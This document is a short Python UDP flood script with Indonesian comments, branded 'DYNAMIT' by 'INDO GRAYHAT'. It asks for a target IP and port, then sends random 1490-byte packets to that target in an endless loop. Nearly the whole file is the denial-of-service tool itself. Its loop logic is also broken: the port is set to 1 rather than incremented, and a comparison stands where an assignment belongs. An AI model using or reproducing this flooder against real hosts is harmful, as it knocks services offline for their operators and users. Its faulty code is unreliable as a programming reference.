import os
import sys
import time
import datetime
import socket
import random
import getpass
import itertools
import threading
import time
import sys
import termcolor
import colorama
#warna
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
from datetime import datetime
from termcolor import colored, cprint
print_red = lambda x: cprint(x, 'red')
print_green = lambda x: cprint(x, 'green')
print_yellow = lambda x: cprint(x, 'yellow')
#waktu
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#pembersih
os.system("clear")
#==============================#
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#==============================#

os.system("clear")
os.system("pyfiglet -f banner3-D -c CYAN DYNAMIT ")
print_green(70* "=")
print (colored("""
             [+]AUTHOR : NONAME
             [+]TIM   : INDO GRAYHAT
    """, 'red'))
print_green(70* "=")
ip = raw_input (Fore.CYAN+"MASUKAN IP: ")
port = input(Fore.RED+"MASUKAN PORT: ")
os.system("clear")
time.sleep(2)
done = False

#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r login now ')

t = threading.Thread(target=animate)
t.start()

#proses lama disini

time.sleep(10)
done = True
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes,(ip,port))
    terkirim = + 1
    port = + 1 
    print_yellow("terkirim")
    if port == 65534:
        port == 1